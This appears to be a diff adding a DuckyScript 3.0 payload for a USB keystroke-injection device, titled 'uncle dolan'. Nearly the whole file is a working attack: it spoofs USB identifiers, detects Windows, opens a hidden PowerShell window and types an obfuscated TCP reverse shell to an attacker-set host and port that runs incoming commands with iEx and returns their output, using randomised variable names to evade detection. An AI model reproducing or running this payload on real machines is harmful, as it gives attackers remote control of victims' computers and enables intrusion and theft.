@@ -1,0 +1,352 @@
+REM #############################################################################
+REM # DuckyScript 3.0                                                           #
+REM # Title:                              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    #
+REM #     uncle dolan                     ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⢿⣷⣾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    #
+REM #                                     ⠀⠀⠀⠀⢀⠔⠋⠀⠀⠀⠀⠈⠻⣿⣿⣇⡠⠤⠤⠤⠤⢄⡀⠀⠀⠀⠀⠀    #
+REM # Author:                             ⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀⠙⡆⠀⠀⠀⠀    #
+REM #     irrrwin                         ⠀⠀⠀⡷⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⡇⠀⠀⠀⠀    #
+REM #                                     ⠀⠀⠀⡇⠀⣀⣤⣶⣿⡿⠿⠻⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⡿⠁⠀⠀⠀⠀    #
+REM # Compatibility:                      ⠀⠀⠀⣷⣾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⢤⡀⠀⠀⠀    #
+REM #     Windows                         ⠀⢀⡴⠊⠁⠀⢀⡠⠐⠒⠢⣄⣀⣀⡀⠀⢀⡔⠉⠉⠐⢄⠀⠀⠈⠳⡀⠀    #
+REM #                                     ⢠⠋⠀⠀⠀⠀⡎⢠⣾⣶⣄⡟⠁⠀⠈⢣⡎⢀⣾⣿⣦⠈⢆⠀⠀⠀⠹⡀    #
+REM # Description:                        ⢸⠀⠀⠀⣀⡤⠗⠛⢛⣋⡡⠤⠤⠄⣀⠀⠙⢺⠟⠛⠛⣓⣽⡦⠀⠀⠀⡇    #
+REM #     Spawn a reverse shell via       ⢸⠀⠀⠀⠘⠷⣲⣖⢅⣀⡠⠤⠤⠤⠆⣉⠍⣉⣉⠭⠝⠚⠉⠀⠀⠀⠀⡇    #
+REM #     obfuscated powershell.          ⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇    #
+REM #                                     ⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀    #
+REM # Usage:                                                                    #
+REM #     0. Insert Ducky.                                                      #
+REM #     1. ...                                                                #
+REM #     2. Profit.                                                            #
+REM #                                                                           #
+REM # Kudos:                                                                    #
+REM #     * 0iphor13, Korben   -   "ReverseDuckyPolymorph"                      #
+REM #                                                                           #
+REM # Disclaimer:                                                               #
+REM #     *This program is free software: you can redistribute it and/or modify #
+REM #     it under the terms of the GNU General Public License as published by  #
+REM #     the Free Software Foundation, either version 3 of the License, or (at #
+REM #     your option) any later version.*                                      #
+REM #                                                                           #
+REM #     *You should have received a copy of the GNU General Public License    #
+REM #     along with this program. If not, see http://www.gnu.org/licenses/ *   #
+REM #                                                                           #
+REM #############################################################################
+
+
+DEFINE VID VID_D34D
+DEFINE PID PID_B33F
+DEFINE MAN MAN_Pentest
+DEFINE PROD PROD_DUCKY
+DEFINE SERIAL SERIAL_30062049
+
+DEFINE LHOST '<host>'
+DEFINE LPORT <port>
+
+DEFINE MAX_WAIT 150
+DEFINE CHECK_INTERVAL 20
+DEFINE WINDOWS_HOST_REQUEST_COUNT 2
+DEFINE NOT_WINDOWS 7
+
+VAR $MAX_TRIES = MAX_WAIT
+WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+    DELAY CHECK_INTERVAL
+    $MAX_TRIES = ($MAX_TRIES - 1)
+END_WHILE
+IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
+    $_OS = WINDOWS
+ELSE
+    $_OS = NOT_WINDOWS
+END_IF
+
+IF ($_OS == WINDOWS) THEN
+    IF ($_CAPSLOCK_ON == TRUE)
+        CAPSLOCK
+    END_IF
+    VAR $S0_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S0_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S0_3 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S1_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S1_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S1_3 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S2_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S2_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S2_3 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S3_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S3_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S3_3 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S4_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S4_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S4_3 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S5_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S5_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S5_3 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S6_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S6_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S6_3 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S7_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S7_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S7_3 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S8_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S8_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S8_3 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S9_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S9_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S9_3 = $_RANDOM_NUMBER_KEYCODE
+    VAR $S10_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S10_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $S10_3 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S11_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S11_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $S11_3 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V0_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V0_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V1_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $V1_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $V2_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $V2_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $V3_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V3_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $V4_1 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $V4_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V5_1 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V5_2 = $_RANDOM_NUMBER_KEYCODE
+    VAR $V6_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $V6_2 = $_RANDOM_LOWER_LETTER_KEYCODE
+    VAR $V7_1 = $_RANDOM_NUMBER_KEYCODE
+    VAR $V7_2 = $_RANDOM_UPPER_LETTER_KEYCODE
+
+    GUI r
+    DELAY 500
+    STRINGLN powershell -nop -noni -w h
+    DELAY 500
+    STRING $
+    INJECT_VAR $S0_1
+    INJECT_VAR $S0_2
+    INJECT_VAR $S0_3
+    STRING ='asciiENCodINg';
+    STRING $
+    INJECT_VAR $S1_1
+    INJECT_VAR $S1_2
+    INJECT_VAR $S1_3
+    STRING ='GETbytES';
+    STRING $
+    INJECT_VAR $S2_1
+    INJECT_VAR $S2_2
+    INJECT_VAR $S2_3
+    STRING ='gETSTrEam';
+    STRING $
+    INJECT_VAR $S3_1
+    INJECT_VAR $S3_2
+    INJECT_VAR $S3_3
+    STRING ='gETstriNG';
+    STRING $
+    INJECT_VAR $S4_1
+    INJECT_VAR $S4_2
+    INJECT_VAR $S4_3
+    STRING ='leNgTh';
+    STRING $
+    INJECT_VAR $S5_1
+    INJECT_VAR $S5_2
+    INJECT_VAR $S5_3
+    STRING ='nEt';
+    STRING $
+    INJECT_VAR $S6_1
+    INJECT_VAR $S6_2
+    INJECT_VAR $S6_3
+    STRING ='REaD';
+    STRING $
+    INJECT_VAR $S7_1
+    INJECT_VAR $S7_2
+    INJECT_VAR $S7_3
+    STRING ='SOCkEtS';
+    STRING $
+    INJECT_VAR $S8_1
+    INJECT_VAR $S8_2
+    INJECT_VAR $S8_3
+    STRING ='sySTEM';
+    STRING $
+    INJECT_VAR $S9_1
+    INJECT_VAR $S9_2
+    INJECT_VAR $S9_3
+    STRING ='tcpCLIenT';
+    STRING $
+    INJECT_VAR $S10_1
+    INJECT_VAR $S10_2
+    INJECT_VAR $S10_3
+    STRING ='TEXt';
+    STRING $
+    INJECT_VAR $S11_1
+    INJECT_VAR $S11_2
+    INJECT_VAR $S11_3
+    STRING ='WritE';
+    STRING $
+    INJECT_VAR $V0_1
+    INJECT_VAR $V0_2
+    STRING =nEw-OBJECT
+    SPACE
+    STRING "
+    STRING $
+    INJECT_VAR $S8_1
+    INJECT_VAR $S8_2
+    INJECT_VAR $S8_3
+    STRING .
+    STRING $
+    INJECT_VAR $S5_1
+    INJECT_VAR $S5_2
+    INJECT_VAR $S5_3
+    STRING .
+    STRING $
+    INJECT_VAR $S7_1
+    INJECT_VAR $S7_2
+    INJECT_VAR $S7_3
+    STRING .
+    STRING $
+    INJECT_VAR $S9_1
+    INJECT_VAR $S9_2
+    INJECT_VAR $S9_3
+    STRING "
+    STRING ( LHOST , LPORT );
+    STRING $
+    INJECT_VAR $V1_1
+    INJECT_VAR $V1_2
+    STRING =
+    STRING $
+    INJECT_VAR $V0_1
+    INJECT_VAR $V0_2
+    STRING .
+    STRING $
+    INJECT_VAR $S2_1
+    INJECT_VAR $S2_2
+    INJECT_VAR $S2_3
+    STRING ();[bYTe[]]
+    STRING $
+    INJECT_VAR $V2_1
+    INJECT_VAR $V2_2
+    STRING =0..65535|%{0};whIlE((
+    STRING $
+    INJECT_VAR $V3_1
+    INJECT_VAR $V3_2
+    STRING =
+    STRING $
+    INJECT_VAR $V1_1
+    INJECT_VAR $V1_2
+    STRING .
+    STRING $
+    INJECT_VAR $S6_1
+    INJECT_VAR $S6_2
+    INJECT_VAR $S6_3
+    STRING (
+    STRING $
+    INJECT_VAR $V2_1
+    INJECT_VAR $V2_2
+    STRING ,0,
+    STRING $
+    INJECT_VAR $V2_1
+    INJECT_VAR $V2_2
+    STRING .
+    STRING $
+    INJECT_VAR $S4_1
+    INJECT_VAR $S4_2
+    INJECT_VAR $S4_3
+    STRING )) -ne 0){
+    STRING $
+    INJECT_VAR $V4_1
+    INJECT_VAR $V4_2
+    STRING =(New-ObJECt -tyPEnaME
+    SPACE
+    STRING "
+    STRING $
+    INJECT_VAR $S8_1
+    INJECT_VAR $S8_2
+    INJECT_VAR $S8_3
+    STRING .
+    STRING $
+    INJECT_VAR $S10_1
+    INJECT_VAR $S10_2
+    INJECT_VAR $S10_3
+    STRING .
+    STRING $
+    INJECT_VAR $S0_1
+    INJECT_VAR $S0_2
+    INJECT_VAR $S0_3
+    STRING "
+    STRING ).
+    STRING $
+    INJECT_VAR $S3_1
+    INJECT_VAR $S3_2
+    INJECT_VAR $S3_3
+    STRING (
+    STRING $
+    INJECT_VAR $V2_1
+    INJECT_VAR $V2_2
+    STRING ,0,
+    STRING $
+    INJECT_VAR $V3_1
+    INJECT_VAR $V3_2
+    STRING );
+    STRING $
+    INJECT_VAR $V5_1
+    INJECT_VAR $V5_2
+    STRING =(iEx
+    SPACE
+    STRING $
+    INJECT_VAR $V4_1
+    INJECT_VAR $V4_2
+    SPACE
+    STRING 2>&1|out-string);
+    STRING $
+    INJECT_VAR $V6_1
+    INJECT_VAR $V6_2
+    STRING =
+    STRING $
+    INJECT_VAR $V5_1
+    INJECT_VAR $V5_2
+    STRING +'h@x '+(pwd)+'> ';
+    STRING $
+    INJECT_VAR $V7_1
+    INJECT_VAR $V7_2
+    STRING =([teXT.eNcODing]::aSCIi).
+    STRING $
+    INJECT_VAR $S1_1
+    INJECT_VAR $S1_2
+    INJECT_VAR $S1_3
+    STRING (
+    STRING $
+    INJECT_VAR $V6_1
+    INJECT_VAR $V6_2
+    STRING );
+    STRING $
+    INJECT_VAR $V1_1
+    INJECT_VAR $V1_2
+    STRING .
+    STRING $
+    INJECT_VAR $S11_1
+    INJECT_VAR $S11_2
+    INJECT_VAR $S11_3
+    STRING (
+    STRING $
+    INJECT_VAR $V7_1
+    INJECT_VAR $V7_2
+    STRING ,0,
+    STRING $
+    INJECT_VAR $V7_1
+    INJECT_VAR $V7_2
+    STRING .
+    STRING $
+    INJECT_VAR $S4_1
+    INJECT_VAR $S4_2
+    INJECT_VAR $S4_3
+    STRING );
+    STRING $
+    INJECT_VAR $V1_1
+    INJECT_VAR $V1_2
+    STRING .FLUSH()};
+    STRING $
+    INJECT_VAR $V0_1
+    INJECT_VAR $V0_2
+    STRING .cloSe();exIt
+    DELAY 100
+    ENTER
+ELSE
+    ATTACKMODE STORAGE
+END_IF
